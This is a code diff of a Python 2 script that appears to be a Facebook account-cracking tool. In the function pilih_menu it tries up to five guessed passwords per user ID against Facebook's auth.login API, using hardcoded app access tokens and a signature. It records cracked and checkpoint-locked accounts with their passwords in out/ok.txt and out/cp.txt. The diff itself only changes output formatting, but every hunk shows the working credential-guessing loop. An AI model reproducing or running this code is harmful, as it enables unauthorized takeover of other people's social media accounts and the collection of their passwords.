@@ -189,14 +189,14 @@ def pilih_menu():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\033[0;92m\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass1
+				print '\033[0;92m*-->\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass1
 				ok.append(uid+' | '+pass1)
 				save = open('out/ok.txt','a')
 				save.write(str(uid)+' | '+str(pass1)+'\n')
 				save.close()
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\033[0;93m\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass1
+					print '\033[0;93m*-->\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass1
 					cp.append(uid+' | '+pass1)
 					save = open('out/cp.txt','a')
 					save.write(str(uid)+' | '+str(pass1)+'\n')
@@ -206,14 +206,14 @@ def pilih_menu():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\033[0;92m\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass2
+						print '\033[0;92m*-->\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass2
 						cp.append(uid+' | '+pass2)
 						save = open('out/ok.txt','a')
 						save.write(str(uid)+' | '+str(pass2)+'\n')
 						save.close()
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\033[0;93m\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass2
+							print '\033[0;93m*-->\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass2
 							cp.append(uid+' | '+pass2)
 							save = open('out/cp.txt','a')
 							save.write(str(uid)+' | '+str(pass2)+'\n')
@@ -223,14 +223,14 @@ def pilih_menu():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\033[0;92m\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' +pass3
+								print '\033[0;92m*-->\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' +pass3
 								ok.append(uid+' | '+pass3)
 								save = open('out/ok.txt','a') 
 								save.write(str(uid)+' | '+str(pass3)+'\n')
 								save.close()
 							else:
 								if 'www.facebook.com' in q['error_msg']:
-									print '\033[0;93m\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass3
+									print '\033[0;93m*-->\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass3
 									ok.append(uid+' | '+pass3)
 									save = open('out/cp.txt','a')
 									save.write(str(uid)+' | '+str(pass3)+'\n')
@@ -240,14 +240,14 @@ def pilih_menu():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\033[0;92m\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass4
+										print '\033[0;92m*-->\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass4
 										ok.append(uid+' | '+pass4)
 										save = open('out/ok.txt','a')
 										save.write(str(uid)+' | '+str(pass4)+'\n')
 										save.close()
 									else:
 										if 'www.facebook.com' in q['error_msg']:
-											print '\033[0;93m\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass4
+											print '\033[0;93m*-->\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass4
 											cp.append(uid+' | '+pass4)
 											save = open('out/cp.txt','a')
 											save.write(str(uid)+' | '+str(pass4)+'\n')
@@ -257,14 +257,14 @@ def pilih_menu():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\033[0;92m\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
+												print '\033[0;92m*-->\033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
 												ok.append(uid+' | '+pass5)
 												save = open('out/ok.txt','a')
 												save.write(str(uid)+' | '+str(pass5)+'\n')
 												save.close()
 											else:
 												if 'www.facebook.com' in q['error_msg']:
-													print '\033[0;93m\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
+													print '\033[0;93m*-->\033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
 													cp.append(uid+' | '+pass5)
 													save = open('out/cp.txt','a')
 													save.write(str(uid)+' | '+str(pass5)+'\n')
